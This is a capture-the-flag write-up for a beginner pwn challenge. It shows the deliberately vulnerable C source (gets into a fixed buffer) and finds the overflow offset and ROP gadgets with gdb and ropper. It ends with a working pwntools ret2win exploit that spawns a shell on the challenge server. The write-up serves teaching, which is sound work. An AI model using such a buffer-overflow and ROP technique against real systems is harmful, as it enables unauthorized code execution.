# Overlows Keep Flowing

## Description

Overlows keep flowing | 133 points

Oh no! Another thing in another system broke, causing more overflows. This time you have to tell shutoff() what to shut off. Can you save the fl4gtory?

This is the second challenge in the pwn intro series

`ncat --ssl overflows-keep-flowing-0.chals.kitctf.de 1337`

Downloads: [overflows-keep-flowing.tar.gz](https://ctf.kitctf.de/files/9296c5d8054162d7d0bfebf429595d11/overflows-keep-flowing.tar.gz?token=eyJ1c2VyX2lkIjo4MzksInRlYW1faWQiOjUwNCwiZmlsZV9pZCI6Njd9.ZIN2mw.TClLcffi089EPC0WIQouSB5QSKY)


## Analysis

Another ret2win challenge but with an argument of type `long long int`.

```c
#include <stdio.h>
#include <stdlib.h>

// gcc -no-pie -fno-stack-protector -o overflows-keep-flowing overflows-keep-flowing.c

void shutoff(long long int arg1) {
	printf("Phew. Another accident prevented. Shutting off %lld\n", arg1);
	if (arg1 == 0xdeadbeefd3adc0de) {
		execve("/bin/sh", NULL, NULL);
	} else {
		exit(0);
	}
}

int main() {
	char buf[0xff]; // 255
	gets(buf);
	puts(buf);
	return 0;
}
```
`-no-pie` means that addresses will be the same when program is run, meaning remote application has same address.<br>
`-fno-stack-protector` basically allows buffer overflows to happen.

To overflow the buffer we need more then 255 characters, if RIP (x64 Instruction Pointer) is overwritten with address of our choice (shutdown) with the correct argument we can "win".

Let's find padding.
```sh
└─$ cyclic 300 | clip 

└─$ gdb -q ./overflow-in-the-fl4gtory
pwndbg> run
{PASTE_CYCLIC_PATTERN}
... Program Crashes ...

*RBP  0x636161706361616f ('oaacpaac')
*RSP  0x7ffd7a4547d8 ◂— 'qaacraacsaactaacuaacvaacwaacxaacyaac'
*RIP  0x4011b8 (main+52) ◂— ret 

pwndbg> quit

└─$ cyclic -l qaac
264 # Padding
```
<small>Note: `clip` directs output to clipboard `alias clip="xclip -sel clip"`</small>

Now we need return address of `shutoff`
```sh
>>> from pwn import *
>>> elf = ELF("./overflows-keep-flowing", checksec=False)
>>> elf.functions.shutoff
Function(name='shutoff', address=0x4011b6, size=0x5c, elf=ELF('./overflows-keep-flowing'))
```

<small>This can also be found with gdb `gdb ./program -> info functions` or [**radare2**](https://github.com/radareorg/radare2) `r2 ./program -> aaa -> afl`</small>

We will also need a `pop_rdi` gadget to put param1 into register.
```sh
└─$ ropper --file overflows-keep-flowing --search "pop rdi"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi

[INFO] File: overflows-keep-flowing
0x00000000004012b3: pop rdi; ret; 
```

## Solution

```py
from pwn import *

# context.log_level = "DEBUG"

exe = "./overflows-keep-flowing"
elf = context.binary = ELF(exe, checksec=False)

if args.REMOTE:
    proc = remote('overflows-keep-flowing-0.chals.kitctf.de', 1337, ssl=True)
else: 
    proc = process(exe)

padding = 264
payload = flat(
    b"\x90" * padding,    # padding
    0x4012b3,             # pop_rdi (gadget)
    0xdeadbeefd3adc0de,   # param 1
    0x40101a,             # ret (gadget)
    elf.functions.shutoff # Function we want to jump to
)
proc.sendline(payload)
proc.recvline() # puts

proc.recvline() # function printf
proc.sendline(b"cat flag.txt; echo;")
flag = proc.recvline().decode().strip()
print(flag)

# or comment lines above and use the shell and use cat
# proc.interactive()
```

```sh
└─$ py exploit.py REMOTE
[+] Opening connection to overflows-keep-flowing-0.chals.kitctf.de on port 1337: Done
GPNCTF{1_h0p3_y0u_d1dn't_actually_bu1ld_a_r0p_cha1n}
[*] Closed connection to overflows-keep-flowing-0.chals.kitctf.de port 1337
```

#### PS

I had trouble making the exploit work on remote, [this](https://www.reddit.com/r/securityCTF/comments/nbb5z2/comment/gy2vv2x/) reddit comment helped (by [ebeip90](https://www.reddit.com/user/ebeip90/))

If you want to explore difference between x32 and x64 [CryptoCat](https://www.youtube.com/playlist?list=PLHUKi1UlEgOIc07Rfk2Jgb5fZbxDPec94) has great video [# 4: Ret2Win with Function Parameters](https://youtu.be/vO1Uj2v3r7I)